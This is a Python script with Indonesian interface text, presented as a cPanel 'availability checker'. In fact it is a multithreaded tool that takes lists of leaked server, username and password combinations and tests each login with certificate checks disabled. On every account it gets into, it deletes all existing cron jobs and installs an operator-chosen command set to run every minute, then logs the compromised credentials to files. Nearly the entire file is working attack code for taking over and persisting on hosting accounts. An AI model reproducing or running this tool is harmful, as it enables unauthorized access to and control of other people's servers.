"""cpanel-checker is a simple python script that checks the availability of a cpanel server."""
import sys
import subprocess
import os
import signal
import math
import threading
import queue

# check if internet is available
try:
    import socket

    socket.create_connection(("www.google.com", 80))
except OSError:
    print("No internet connection")
    sys.exit(1)

try:
    import requests
except ImportError:
    # install it from python code
    print("Installing requests...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    import requests
    print("Requests installed")

try:
    import urllib3
except ImportError:
    # install it from python code
    print("Installing urllib3...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "urllib3"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    import urllib3
    print("Urllib3 installed")

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    import pyfiglet
except ImportError:
    # install it from python code
    print("Installing pyfiglet...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyfiglet"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    import pyfiglet
    print("Pyfiglet installed")


try:
    import json
except ImportError:
    # install it from python code
    print("Installing json...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "json"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    import json
    print("Json installed")

try:
    from termcolor import colored, cprint
except ImportError:
    # install it from python code
    print("Installing termcolor...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "termcolor"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    from termcolor import colored, cprint
    print("Termcolor installed")

try:
    import pyboxen
except ImportError:
    # install it from python code
    print("Installing pyboxen...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyboxen"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    import pyboxen
    print("Pyboxen installed")

def print_banner():
    program_name = "C E K E R"
    version = "1.0"
    author = "Ihsan Devs"
    figletted_program_name = pyfiglet.figlet_format(program_name, font="slant")
    

    program_desc = f"""[yellow dim][underline2 bold][magenta]CEKER[/magenta] ([magenta]C[/magenta]panel Ch[magenta]E[/magenta]c[magenta]KER[/magenta])[/underline2 bold] adalah sebuah program yang digunakan untuk mengecek ketersediaan server cPanel.

Fitur:
- [bold]Proses pengecekan multi-thread[/bold]
- [bold]Menambahkan command custom di cronjob[/bold]
- [bold]Menghapus cronjob lama[/bold]
- [bold]Mendukung semua OS[/bold]
[/yellow dim]"""

    print(pyboxen.boxen(f"[green blink]{figletted_program_name}[/green blink]", program_desc, title=f"[green]{program_name}[/green] v[yellow]{version}[/yellow] by [green]{author}[/green]", padding=1, margin=1, text_alignment="center", color="magenta", title_alignment="center"))


def check_cpanel(server, username, password, command_to_added_in_cpanel):
    try:
        """Check the availability of a cpanel server."""
        url = f"{server}/login/?login_only=1"

        body = {
            "user": username.strip(),
            "pass": password.strip(),
            "goto_uri": "/",
        }

        try:
            response = requests.post(url, data=body, verify=False, timeout=5)
        except requests.exceptions.ConnectionError:
            # print(colored(f"{server} is unavailable", "red"), end="\n")
            return

        response_json = json.loads(response.text)

        if response_json["status"] == 1:
            print(colored(f"{server} is available", "blue"), end="\n")

            # get all cronjobs
            get_all_cronjobs(server, username, password, command_to_added_in_cpanel)

            # write the available server to available_servers.txt
            with open("available_servers.txt", "a") as f:
                f.write(f"{server}|{username}|{password}\n")

            return True
        else:
            # print(colored(f"{server} is unavailable", "red"), end="\n")
            return
    except Exception:
        return
    finally:
        return


def get_all_cronjobs(server, username, password, command_to_added_in_cpanel):
    """Get all cronjobs from the server."""
    try:
        url = f"{server}/json-api/cpanel?cpanel_jsonapi_user={username}&cpanel_jsonapi_apiversion=2&cpanel_jsonapi_module=Cron&cpanel_jsonapi_func=listcron"

        response = requests.get(url, auth=(username, password), verify=False, timeout=30)

        response_json = json.loads(response.text)

        cpanelresult = response_json["cpanelresult"]

        # if contain key "error", then cronjobs are not available
        if "error" in cpanelresult:
            print(colored(f"Cronjob feature is not available on {server}", "red"))
            return
        #
        # print(colored(f"Deleting all cronjobs from {server}...", "yellow"))
        delete_all_cronjobs(server, username, password)

        # print(colored(f"Adding new cronjobs to {server}...", "yellow"))
        add_cronjobs(server, username, password, command_to_added_in_cpanel)
        return True
    except Exception:
        return
    finally:
        return


def delete_all_cronjobs(server, username, password):
    """Delete all cronjobs from the server."""
    try:
        url = f"{server}/json-api/cpanel?cpanel_jsonapi_user={username}&cpanel_jsonapi_apiversion=2&cpanel_jsonapi_module=Cron&cpanel_jsonapi_func=listcron"

        response = requests.get(url, auth=(username, password), verify=False, timeout=30)

        response_json = json.loads(response.text)

        # print(response.text)

        cpanelresult = response_json["cpanelresult"]

        for cronjob in cpanelresult["data"]:
            id = cronjob["linekey"]
            url = f"{server}/json-api/cpanel?cpanel_jsonapi_user={username}&cpanel_jsonapi_apiversion=2&cpanel_jsonapi_module=Cron&cpanel_jsonapi_func=remove_line&linekey={id}"
            response = requests.get(url, auth=(username, password), verify=False, timeout=30)

            result = json.loads(response.text)

            # if key "error" is in the result, then cronjob is not added
            if "error" in result["cpanelresult"]:
                print(
                    colored(f"Failed to add cronjob to {server}. Reason: {result['cpanelresult']['event']['reason']}",
                            "red"), end="\n")
                continue

            print(colored(f"Cronjob with id {id} deleted successfully from {server}", "yellow"), end="\n")
            return True
    except Exception:
        return
    finally:
        return


def add_cronjobs(server, username, password, command_to_added_in_cpanel):
    """Add new cronjobs to the server."""
    try:
        command = command_to_added_in_cpanel
        url = f"{server}/json-api/cpanel?cpanel_jsonapi_user={username}&cpanel_jsonapi_apiversion=2&cpanel_jsonapi_module=Cron&cpanel_jsonapi_func=add_line&command={command}&day=*&hour=*&minute=*&month=*&weekday=*"  # noqa
        response = requests.get(url, auth=(username, password), verify=False, timeout=30)

        # print(response.text)

        result = json.loads(response.text)

        # if key "error" is in the result, then cronjob is not added
        if "error" in result["cpanelresult"]:
            print(colored(f"Failed to add cronjob to {server}. Reason: {result['cpanelresult']['event']['reason']}", "red"), end="\n")
            return

        print(colored(f"Cronjob added successfully to {server}", "green"), end="\n")

        with open("added_cronjobs.txt", "a") as f:
            f.write(f"{server}|{username}|{password}\n")
        return True
    except Exception:
        return
    finally:
        return


def signal_handler(signal, frame):
    """Handle the signal."""
    print(colored("\nKeluar...", "red"), end="\n")
    sys.exit(0)


def executor(lines, command_to_added_in_cpanel):
    q = queue.Queue()

    # mendapatkan server, username, dan password
    for line in lines:
        if not line.strip():
            continue

        server = line.split("|")[0]

        try:
            username = line.split("|")[1]
        except Exception:
            continue

        try:
            password = "|".join(line.split("|")[2:]).strip()
        except Exception:
            continue

        q.put((server, username, password))

    threads = []
    while not q.empty():
        try:
            server, username, password = q.get()
            t = threading.Thread(target=check_cpanel, args=(server, username, password, command_to_added_in_cpanel), daemon=True)
            threads.append(t)
            t.start()
        except KeyboardInterrupt:
            print(colored("Keluar...", "red"), end="\n")
            sys.exit(0)

    for t in threads:
        try:
            t.join()
        except KeyboardInterrupt:
            print(colored("Keluar...", "red"), end="\n")
            sys.exit(0)


def clear_terminal():
    os_type = sys.platform
    if os_type == "win32":
        subprocess.run("cls", shell=True)
    else:
        subprocess.run("clear", shell=True)


def main():
    """Main function. get file path list and check the availability of each server."""
    signal.signal(signal.SIGINT, signal_handler)

    clear_terminal()

    print_banner()

    try:
        path_to_file = input(colored("Masukkan jalur ke file: ", "magenta"))
    except KeyboardInterrupt:
        print(colored("Keluar...", "red"), end="\n")
        sys.exit(0)

    # periksa apakah file ada
    path_to_file = os.path.abspath(path_to_file)
    
    if not os.path.exists(path_to_file):
        print(colored("File tidak ditemukan", "red"), end="\n")
        return
    
    command_to_added_in_cpanel = input(colored("Masukkan command yang ingin ditambahkan pada cronjob cPanel: ", "magenta"))

    if not command_to_added_in_cpanel or command_to_added_in_cpanel.strip() == "":
        print(colored("Command tidak boleh kosong", "red"), end="\n")
        return
    
    total_lines = sum(1 for line in open(path_to_file))
    print(colored(f"Total baris: {total_lines}", "magenta"), end="\n")

    path_to_file_fixed = path_to_file

    # menghapus available_servers.txt
    with open("available_servers.txt", "w") as f:
        pass

    with open("added_cronjobs.txt", "w") as f:
        pass

    
    print(colored("\nMemulai pengecekan ketersediaan server...", "yellow"), end="\n")

    # membaca file
    with open(os.path.abspath(path_to_file_fixed), "r") as f:
        lines = f.readlines()

    # split and execute each 100 lines
    for i in range(0, len(lines), 100):
        clear_terminal()
        print_banner()

        print(colored(f"\n\nMenjalankan antrian ke-{math.ceil(i/100)+1} dari {math.ceil(len(lines)/100)} antrian", "magenta"), end="\n")
        executor(lines[i:i+100], command_to_added_in_cpanel)

        
    print(colored("Selesai", "green"), end="\n")
    return


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        # firstly, we need to stop all threads
        print(colored("\n\nExiting...", "red"), end="\n")

        for thread in threading.enumerate():
            if thread.name != "MainThread":
                thread.join()
        sys.exit(0)
    except Exception:
        sys.exit(1)
